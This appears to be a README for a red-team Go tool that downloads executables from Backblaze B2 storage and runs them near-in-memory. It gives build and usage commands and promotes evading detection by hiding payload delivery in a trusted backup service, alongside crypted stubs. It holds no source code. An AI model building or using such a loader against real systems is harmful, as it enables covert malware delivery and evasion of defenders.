# Backblaze Memexec 

this is a POC redteaming Go utility that downloads any executable directly from Backblaze B2 cloud storage and executes them stealthily (the goal was pure in memory execution, but there are no golang packages that exist for this purpose, all involve
writing the bytes to an executable in /temp and then invoking it.)

## Features
- Download payloads from a corporate trusted source, if the target is using this as a backup service, it will be very hard to detect.
- Execute payloads pseudo in memory (especially useful if the payload you're executing is a stub of your executable created by https://github.com/carved4/gocrypter or a similar tool)
- Fully modular, payloads can be changed with the ease of a GUI upload to backblaze.
- Backblaze does not require a credit card or insecure email service to sign up.
- Bucket can be switched out easily via changing the hardcoded account ID, application key, and bucket name.
## Installation

```bash
go get github.com/carved4/backblaze-memexec
# Or clone the repository and build it manually
git clone https://github.com/carved4/backblaze-memexec.git
cd backblaze-memexec
# change the account ID, application key, and bucket name in the code.
go build -ldflags="-w -s" -trimpath -o backblaze.exe
# or for linux
GOOS=linux GOARCH=amd64 go build -ldflags="-w -s" -trimpath -o backblaze
```

## Usage

```bash
# Runs the default executable (test.exe) from the default bucket AFTER changing the account ID, application key, and bucket name in the code. 
# also, I recommend changing the DefaultExecutable in main.go from 'test.exe' to whatever the name of your file is before building so you don't have to pass in CLI args.
./backblaze.exe

# Run a specific executable from the default bucket
./backblaze.exe -file my_program.exe
# or
./backblaze.exe my_program.exe

# Run with arguments
./backblaze.exe -args "arg1,arg2,arg3"

# Run a different executable with arguments
./backblaze.exe -file other_program.exe -args "arg1,arg2,arg3"
# or
./backblaze.exe other_program.exe -args "arg1,arg2,arg3"
```

## How It Works

uses the [blazer](https://github.com/kurin/blazer) library to interact with Backblaze B2 API and download files. For psuedo in-memory execution, it uses [go-memexec](https://github.com/amenzhinsky/go-memexec) 

The entire process happens as follows:
1. Connect to Backblaze B2 using hardcoded credentials
2. Download the specified executable file (or test.exe by default) into memory
3. Use go-memexec to execute the file
4. Pass any specified arguments to the executed process

## Security Considerations

- Obviosuly do not use an important (non throwaway) bucket for this, as reverse engineering of the binary may yield the plaintext creds
- The tool does not verify the integrity of downloaded executables
- I am not responsible for your actions, do not use this for malicious purposes.

## Requirements

- Go 1.18 or higher
- Valid Backblaze B2 bucket with appropriate executables

## License

[MIT License](LICENSE) 
